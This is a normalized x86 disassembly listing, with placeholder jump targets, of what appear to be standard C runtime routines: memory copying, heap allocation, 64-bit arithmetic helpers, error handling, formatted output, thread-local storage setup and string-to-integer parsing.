movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4055c1
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_4085c2
pop ecx
call sub_405926
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_4099ab
push 0x1e
call sub_4097fc
push 0xff
call sub_407fe8
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_405926
mov [ eax ] esi
push ebx
call sub_4085c2
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_405926
mov [ eax ] esi
sub_405655
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_405926
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4058e4
pop ecx
mov [ esi ] eax
pop esi
sub_4056a0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_405759
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_40a4d0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40a4b9
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40a4b9
pop ecx
sub_405882
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_405759
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_4058a7
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405882
int3
pop ebp
jmp eax
sub_4058e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40594c
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405939
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_4058e4
pop ecx
mov esi eax
call sub_405926
mov [ eax ] esi
pop esi
pop ebp
retn
sub_405970
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4059f0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_405a58
push 0xc
push r--data
call sub_4082b0
push 0xe
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405abf
call sub_4082f5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_405655
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_405655
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_405ad0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_405b58
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40b3e6
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_405926
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_405926
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_40b231
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40b0be
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40b1db
pop ecx
test eax eax
jne r-xdata
call sub_40b231
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_40b0be
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40b192
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_40a8d7
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_405cbc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_406b90
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40bdb0
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40b62f
mov [ esi + 0x4 ] eax
sub_405d43
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_405b58
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_405d76
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_405d43
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_405d43
sub_405dd8
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_405cbc
call sub_405926
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_40b3e6
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_4069f2
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_406a26
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_40a594
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_406a63
push 0x8
push r--data
call sub_4082b0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406b05
push 0xc
call sub_40a6c4
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_40baf0
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406b0e
call sub_4082f5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_406b17
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_4069f2
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_407e9e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_405655
pop ecx
xor esi esi
push 0x0
push esi
call sub_406a63
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_406baa
push 0x8
push r--data
call sub_4082b0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4082f5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_405655
pop ecx
push 0xd
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_405655
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406cc4
push 0xc
call sub_40a6c4
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406cd0
push esi
call sub_405655
pop ecx
push edi
call sub_40bb7f
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_405655
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40bc18
pop ecx
sub_406cd9
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_406a26
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_4069e9
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_408012
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_40a54a
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_406a26
mov edi [ DecodePointer@IAT ]
push sub_406baa
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_407e9e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_406a63
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_406e76
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_406f2e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_405cbc
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40c01f
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_405926
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_407159
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
